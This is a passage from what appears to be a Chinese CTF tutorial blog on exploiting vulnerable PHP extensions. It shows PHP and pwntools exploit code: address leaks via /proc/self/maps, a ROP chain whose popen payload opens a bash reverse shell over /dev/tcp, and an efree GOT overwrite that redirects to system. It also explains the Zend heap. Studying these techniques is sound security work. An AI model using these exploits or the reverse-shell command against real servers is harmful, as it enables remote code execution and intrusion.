*/</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">                PHP_RINIT(my_heap),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">                PHP_MINFO(my_heap),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">                PHP_MY_HEAP_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">                STANDARD_MODULE_PROPERTIES</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_MY_HEAP</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(my_heap)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>






        <h1 id="三、漏洞利用"   >
          <a href="#三、漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1>
      <p>一般而言，php_pwn都先看看php.ini，哪些函数被禁了，搜索<code>disable_functions</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202122026827.png" alt="image-20220212202639753"></p>
<p>当没有禁止include函数、ob_start函数、ob_get_contents函数、ob_end_flush函数时，就可以来调用从而直接获取地址。</p>

        <h2 id="1-EXP模板"   >
          <a href="#1-EXP模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-EXP模板" class="headerlink" title="1.EXP模板"></a>1.EXP模板</h2>
      <p>先来几个常用的函数模板，用来交互</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$s</span> = bin2hex(<span class="variable">$val</span>);</span><br><span class="line">   <span class="variable">$len</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$ans</span> = <span class="string">&quot;0x&quot;</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$len</span>-<span class="number">2</span>;<span class="variable">$i</span>&gt;=<span class="number">0</span>;<span class="variable">$i</span>-=<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="variable">$ans</span> = <span class="variable">$ans</span> . substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> intval(<span class="variable">$ans</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//在可以调用include函数、ob_start函数、ob_get_contents函数、ob_end_flush函数时</span></span><br><span class="line"><span class="comment">//一般用在可以直接写php代码的时候</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$p1 = &#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/&#x27;;</span></span><br><span class="line">    <span class="variable">$p_local</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/www\/server\/php\/73\/lib\/php\/extensions\/no-debug-non-zts-20180731\/my_heap.so/&#x27;</span>;</span><br><span class="line">    preg_match_all(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="comment">//preg_match_all($p1, $buffer, $mbase);</span></span><br><span class="line">    preg_match_all(<span class="variable">$p_local</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = ob_get_contents();</span><br><span class="line">ob_end_flush();</span><br><span class="line">leakaddr(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span>=hexdec(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span>=hexdec(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串操作</span></span><br><span class="line"><span class="variable">$pad_str</span> = str_pad(string_var,length,pad_string,pad_type);<span class="comment">//填充，(pad_type参数可选)</span></span><br><span class="line"><span class="variable">$sub_str</span> = substr(<span class="keyword">string</span>,idx,length);<span class="comment">//获取子字符串</span></span><br><span class="line"><span class="variable">$str</span> = str_repeat(<span class="string">&#x27;B&#x27;</span>, (<span class="number">0x100</span>));</span><br><span class="line"><span class="comment">//获取格式化输出字符串</span></span><br><span class="line"><span class="keyword">echo</span> sprintf(<span class="string">&quot;0x%lx&quot;</span>,<span class="variable">$Libc_addr</span>);</span><br><span class="line"><span class="comment">//字符串拼接</span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//单个字符</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;\x00&quot;</span>;<span class="comment">//必须是&quot;&quot;双引号的，不能是&#x27;&#x27;单引号</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>并且以下给出的exp都是基于上面的测试用例</p>

        <h2 id="2-格式化字符串"   >
          <a href="#2-格式化字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-格式化字符串" class="headerlink" title="2.格式化字符串"></a>2.格式化字符串</h2>
      
        <h2 id="3-栈溢出"   >
          <a href="#3-栈溢出" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-栈溢出" class="headerlink" title="3.栈溢出"></a>3.栈溢出</h2>
      <p>一般都能够通过读取<code>/proc/self/maps</code>来泄露地址</p>
<p>没有canary的时候，单纯栈溢出的时候，一般有以下几种方法</p>

        <h3 id="1-利用poepn反弹shell"   >
          <a href="#1-利用poepn反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用poepn反弹shell" class="headerlink" title="(1)利用poepn反弹shell"></a>(1)利用poepn反弹shell</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_php</span>(<span class="params">buf</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pwn.php&quot;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line">        pf.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">my_stack_func(urldecode(&quot;%s&quot;));</span></span><br><span class="line"><span class="string">?&gt;&#x27;&#x27;&#x27;</span>%urlencode(buf))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#CLI:</span></span><br><span class="line">stack_addr = <span class="number">0x7fffffffa1c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#GDB:</span></span><br><span class="line"><span class="comment">#stack_addr = 0x7fffffffa1a0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#WEB:</span></span><br><span class="line"><span class="comment">#stack_addr = 0x7fffffffbee0</span></span><br><span class="line"></span><br><span class="line">ELF_base = <span class="number">0x7ffff12efd2a</span> - <span class="number">0xd2a</span></span><br><span class="line"></span><br><span class="line">stack_offset = <span class="number">0xb0</span> + <span class="number">0x8</span></span><br><span class="line">Libc_base = <span class="number">0x7ffff47daf70</span> - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = Libc_base + <span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi_ret = Libc_base + <span class="number">0x0000000000023eea</span></span><br><span class="line">popen_addr = Libc_base + libc.sym[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">layout = [</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*stack_offset,</span><br><span class="line">    pop_rdi_ret,</span><br><span class="line">    stack_addr+stack_offset+<span class="number">0x30</span>+<span class="number">0x10</span>,</span><br><span class="line">    pop_rsi_ret,</span><br><span class="line">    stack_addr+stack_offset+<span class="number">0x28</span>,</span><br><span class="line">    popen_addr,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,</span><br><span class="line">    command.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>),</span><br><span class="line">    <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">]</span><br><span class="line">buf = flat(layout)</span><br><span class="line"></span><br><span class="line">create_php(buf)</span><br></pre></td></tr></table></div></figure>

<p>以上代码生成之后，直接php pwn.php运行或者调试即可。</p>
<p>需要注意的是，WEB和CLI的栈地址有点不太一样，另外在本地运行的时候，直接运行php和调试php也有点不太一样</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121352773.png" alt="image-20220212135202658"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202121343134.png" alt="image-20220212134318923"></p>
<p>参照<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204404" >WEBPWN入门级调试讲解 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h4 id="例题一：2020De1CTF-mixture"   >
          <a href="#例题一：2020De1CTF-mixture" class="heading-link"><i class="fas fa-link"></i></a><a href="#例题一：2020De1CTF-mixture" class="headerlink" title="例题一：2020De1CTF-mixture"></a>例题一：2020De1CTF-mixture</h4>
      <p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235237#h3-4" >WebPwn：php-pwn学习 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/" >De1CTF 2020 Web+Pwn mixture | Clang裁缝店 (xuanxuanblingbling.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="2-rop链构造调用mprotect函数执行shellcode"   >
          <a href="#2-rop链构造调用mprotect函数执行shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-rop链构造调用mprotect函数执行shellcode" class="headerlink" title="(2)rop链构造调用mprotect函数执行shellcode"></a>(2)rop链构造调用<code>mprotect</code>函数执行shellcode</h3>
      
        <h2 id="4-堆方面"   >
          <a href="#4-堆方面" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-堆方面" class="headerlink" title="4.堆方面"></a>4.堆方面</h2>
      
        <h3 id="堆机制："   >
          <a href="#堆机制：" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆机制：" class="headerlink" title="堆机制："></a>堆机制：</h3>
      <p>首先简单介绍一下内存机制，使用<code>_emalloc和_efree</code>进行内存分配和释放，类似不加任何保护的slub/slab机制，存在FD指针可以实现劫持之后任意分配，并且分配的大小规格如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">//宏定义：第一列表示序号（称之为bin_num），第二列表示每个small内存的大小（字节数）；</span><br><span class="line">//第四列表示每次获取多少个page；第三列表示将page分割为多少个大小为第一列的small内存；</span><br><span class="line">#define ZEND_MM_BINS_INFO(_, x, y) \</span><br><span class="line">    _( 0,    8,  512, 1, x, y) \</span><br><span class="line">    _( 1,   16,  256, 1, x, y) \</span><br><span class="line">    _( 2,   24,  170, 1, x, y) \</span><br><span class="line">    _( 3,   32,  128, 1, x, y) \</span><br><span class="line">    _( 4,   40,  102, 1, x, y) \</span><br><span class="line">    _( 5,   48,   85, 1, x, y) \</span><br><span class="line">    _( 6,   56,   73, 1, x, y) \</span><br><span class="line">    _( 7,   64,   64, 1, x, y) \</span><br><span class="line">    _( 8,   80,   51, 1, x, y) \</span><br><span class="line">    _( 9,   96,   42, 1, x, y) \</span><br><span class="line">    _(10,  112,   36, 1, x, y) \</span><br><span class="line">    _(11,  128,   32, 1, x, y) \</span><br><span class="line">    _(12,  160,   25, 1, x, y) \</span><br><span class="line">    _(13,  192,   21, 1, x, y) \</span><br><span class="line">    _(14,  224,   18, 1, x, y) \</span><br><span class="line">    _(15,  256,   16, 1, x, y) \</span><br><span class="line">    _(16,  320,   64, 5, x, y) \</span><br><span class="line">    _(17,  384,   32, 3, x, y) \</span><br><span class="line">    _(18,  448,    9, 1, x, y) \</span><br><span class="line">    _(19,  512,    8, 1, x, y) \</span><br><span class="line">    _(20,  640,   32, 5, x, y) \</span><br><span class="line">    _(21,  768,   16, 3, x, y) \</span><br><span class="line">    _(22,  896,    9, 2, x, y) \</span><br><span class="line">    _(23, 1024,    8, 2, x, y) \</span><br><span class="line">    _(24, 1280,   16, 5, x, y) \</span><br><span class="line">    _(25, 1536,    8, 3, x, y) \</span><br><span class="line">    _(26, 1792,   16, 7, x, y) \</span><br><span class="line">    _(27, 2048,    8, 4, x, y) \</span><br><span class="line">    _(28, 2560,    8, 5, x, y) \</span><br><span class="line">    _(29, 3072,    4, 3, x, y)</span><br><span class="line"> </span><br><span class="line">#endif /* ZEND_ALLOC_SIZES_H */</span><br></pre></td></tr></table></div></figure>

<p>当超过3K时，如下分配</p>
<p>huge内存：针对大于2M-4K的分配请求，直接调用mmap分配；</p>
<p>large内存：针对小于2M-4K，大于3K的分配请求，在chunk上查找满足条件的若干个连续page；</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000014764790" >【PHP7源码分析】PHP内存管理 - SegmentFault 思否</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>并且不存在我们在glibc中常见的hook函数，所以通常getshell的做法一般两种：</p>
<p><strong>劫持efree_got</strong>或者<strong>劫持某些结构体的函数指针</strong></p>

        <h3 id="1-劫持efree-got"   >
          <a href="#1-劫持efree-got" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-劫持efree-got" class="headerlink" title="(1)劫持efree_got"></a>(1)劫持efree_got</h3>
      <p>不过这个需要<code>.so</code>拓展模块不能为Full RELRO，得能修改其中的got表，然后还得在该拓展模块中有调用<code>_efree</code>函数才行，相当于就是<code>ret2Got</code>。得泄露该<code>.so</code>拓展模块的地址才行。</p>
<p>自定义题目的exp如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$s</span> = bin2hex(<span class="variable">$val</span>);</span><br><span class="line">   <span class="variable">$len</span> = strlen(<span class="variable">$s</span>);</span><br><span class="line">   <span class="variable">$ans</span> = <span class="string">&quot;0x&quot;</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="variable">$len</span>-<span class="number">2</span>;<span class="variable">$i</span>&gt;=<span class="number">0</span>;<span class="variable">$i</span>-=<span class="number">2</span>) &#123;</span><br><span class="line">      <span class="variable">$ans</span> = <span class="variable">$ans</span> . substr(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">2</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> intval(<span class="variable">$ans</span>,<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$p1 = &#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20170718\/hackphp.so/&#x27;;</span></span><br><span class="line">    <span class="variable">$p_local</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/www\/server\/php\/73\/lib\/php\/extensions\/no-debug-non-zts-20180731\/my_heap.so/&#x27;</span>;</span><br><span class="line">    preg_match_all(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="comment">//preg_match_all($p1, $buffer, $mbase);</span></span><br><span class="line">    preg_match_all(<span class="variable">$p_local</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_efree_got</span> = <span class="number">0x202068</span>;</span><br><span class="line"><span class="variable">$system_addr</span> = <span class="number">0x4f550</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ob_start(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line"><span class="variable">$buffer</span> = ob_get_contents();</span><br><span class="line">ob_end_flush();</span><br><span class="line">leakaddr(<span class="variable">$buffer</span>);</span><br><span class="line"><span class="variable">$libc_base</span>=hexdec(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$mod_base</span>=hexdec(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_delFunc(<span class="number">0</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">0</span>,p64(<span class="variable">$mod_base</span>+<span class="variable">$_efree_got</span>));</span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">1</span>,<span class="string">&quot;cat flag\x00&quot;</span>);</span><br><span class="line">my_heap_addFunc(<span class="number">0x10</span>);</span><br><span class="line">my_heap_editFunc(<span class="number">2</span>,p64(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>));</span><br><span class="line">my_heap_delFunc(<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-劫持get-method函数指针"   >
          <a href="#2-劫持get-method函数指针" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-劫持get-method函数指针" class="headerlink" title="(2)劫持get_method函数指针"></a>(2)劫持get_method函数指针</h3>
      <p>简单来说，就是劫持函数指针<code>zend_object-&gt;zval-&gt;zend_object_handlers-&gt;get_method</code></p>

        <h4 id="原理如下："   >
          <a href="#原理如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理如下：" class="headerlink" title="原理如下："></a>原理如下：</h4>
      
        <h5 id="①zend-object"   >
          <a href="#①zend-object" class="heading-link"><i class="fas fa-link"></i></a><a href="#①zend-object" class="headerlink" title="①zend_object"></a>①zend_object</h5>
      <p>当定义声明一个class对象时</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Lucky&#123;</span><br><span class="line">	public    $a0, $a1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lucky = new Lucky();</span><br><span class="line">$lucky-&gt;a1 = function ($x) &#123; &#125;;</span><br></pre></td></tr></table></div></figure>

<p>当在php中声明Lucky这个class对象时，会自动声明一个对应大小<code>zend_object</code>结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.3/src/Zend/zend_types.h 大小56</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="keyword">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">    zend_class_entry *ce;</span><br><span class="line">    <span class="keyword">const</span> zend_object_handlers *handlers;</span><br><span class="line">    HashTable        *properties;</span><br><span class="line">    zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>正常来说，创建class对象都会有成员，但是在php中其实也可以声明没有成员的class对象，那么此时该class对应的<code>zend_object</code>的大小即为56-8=48。所以class对象中的成员越多，其<code>zend_object</code>结构的大小就越大。</p>

        <h5 id="②zval"   >
          <a href="#②zval" class="heading-link"><i class="fas fa-link"></i></a><a href="#②zval" class="headerlink" title="②zval"></a>②zval</h5>
      <p>而每一个成员在内存中实际反应的就是<code>zval</code>结构体</p>
